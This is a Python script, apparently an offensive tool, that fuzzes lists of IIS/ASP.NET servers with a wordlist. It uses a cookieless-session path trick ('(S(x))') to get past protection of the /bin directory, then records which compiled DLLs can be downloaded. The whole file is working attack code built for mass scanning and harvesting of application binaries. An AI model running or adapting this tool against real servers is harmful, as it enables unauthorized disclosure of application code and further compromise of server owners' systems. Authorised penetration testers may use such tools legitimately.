import asyncio
import aiohttp
import click
from typing import List
from tqdm.asyncio import tqdm_asyncio
import logging
from colorama import Fore, Style

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Create a file handler for logging successful findings
file_handler = logging.FileHandler('found_urls.log', mode='a')
file_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(message)s')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

found_log = []

class FuzzRequester:
    def __init__(self, urls: List[str], word_list: List[str], throttle: float):
        self.urls = urls
        self.word_list = word_list
        self.throttle = throttle

    async def send_request(self, session: aiohttp.ClientSession, base_url: str, word: str):
        url = f"{base_url}//(S(x))/b/(S(x))in/{word}.dll"  # Adjusted URL structure
        try:
            timeout = aiohttp.ClientTimeout(total=10)  # Extended timeout to 10 seconds
            async with session.get(url, ssl=False, timeout=timeout, allow_redirects=False) as response:
                if response.status == 200:
                    content_type = response.headers.get('Content-Type', '').lower()

                    # Ensure we're properly checking for the DLL content type
                    if 'application/x-msdownload' in content_type or 'application/octet-stream' in content_type:
                        hit_message = f"Success: {url} (DLL likely present)"
                        logger.info(hit_message)
                        print(Fore.GREEN + hit_message + Style.RESET_ALL)

                        if url not in found_log:
                            found_log.append(url)
                            with open('iis_results/found_urls.log', 'a') as file:
                                file.write(f'{url}\n')
                elif response.status != 404:
                    # Handle non-404 statuses if needed
                    pass

        except asyncio.TimeoutError:
            # Handle timeout error
            pass
        except aiohttp.ClientError:
            # Handle client error
            pass
        finally:
            await asyncio.sleep(self.throttle)  # Throttle the requests

    async def run(self):
        semaphore = asyncio.Semaphore(100)  # Limit concurrent requests
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit_per_host=10)) as session:
            tasks = [
                self.fetch_with_semaphore(session, url, word, semaphore)
                for url in self.urls
                for word in self.word_list
            ]
            await tqdm_asyncio.gather(*tasks, desc="Processing URLs", unit="req")

    async def fetch_with_semaphore(self, session: aiohttp.ClientSession, url: str, word: str, semaphore: asyncio.Semaphore):
        async with semaphore:
            await self.send_request(session, url, word)

def read_lines_from_file(file_path: str) -> List[str]:
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

@click.command()
@click.option('--file-path', type=click.Path(exists=True), prompt='Path to the URLs file', help='File containing the list of URLs.')
@click.option('--wordlist-path', type=click.Path(exists=True), prompt='Path to wordlist file', help='File containing the list of words to fuzz.')
@click.option('--throttle', default=0.1, help='Throttle time in seconds between requests (default: 0.1).')
def main(file_path, wordlist_path, throttle):
    urls = read_lines_from_file(file_path)
    word_list = read_lines_from_file(wordlist_path)
    requester = FuzzRequester(urls, word_list, throttle)
    asyncio.run(requester.run())

    if found_log:
        print(f"\n{Fore.GREEN}Found URLs:{Style.RESET_ALL}")
        for url in found_log:
            print(url)

if __name__ == "__main__":
    main()
